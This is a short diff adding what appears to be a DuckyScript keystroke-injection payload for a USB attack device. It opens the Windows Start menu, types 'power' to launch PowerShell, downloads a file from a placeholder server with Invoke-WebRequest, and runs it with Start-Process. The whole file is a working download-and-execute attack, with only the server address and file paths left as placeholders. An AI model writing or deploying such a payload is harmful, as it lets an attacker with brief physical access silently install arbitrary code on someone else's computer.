@@ -1,0 +1,14 @@
+DELAY 1000
+CONTROL ESCAPE
+DELAY 300
+STRING power
+DELAY 1000
+ENTER
+DELAY 2000
+STRING Invoke-WebRequest -Uri http://(serverip)/filename -OutFile (where to save file)
+ENTER
+DELAY 2000
+STRING Start-Process -FilePath (saved file location)
+ENTER
+DELAY 2000
+EXIT
